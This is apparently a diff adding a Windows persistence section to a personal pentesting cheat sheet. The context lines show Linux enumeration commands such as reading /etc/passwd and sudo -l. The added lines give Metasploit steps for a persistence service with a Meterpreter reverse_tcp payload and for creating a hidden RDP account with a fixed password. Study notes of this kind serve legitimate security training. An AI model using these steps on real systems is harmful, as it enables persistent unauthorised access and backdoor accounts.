@@ -256,8 +256,27 @@ cat /etc/passwd
 sudo -l
 https://gtfobins.github.io/ 
 
+## Windows Persistence 
++ Persistence Via Service
++ Consist of techniques that adversises use to keep access to system across restart, changed credntials and inttrupte cut off their resousne
++ maiuant persience
++ 
+```
+background
+msf6> search persistence_service
+set LPORT diffrent_port
+payload windows/meterpreter/reverse_tcp
+
+```
+## Persistence via RDP 
+ 
+```
+meterpreter> run getgui -e -u danny -p hacker123321
+
+xfreerdp /u:danny /p:hacker123321 /v:IP
 
 
 
+```
 
 
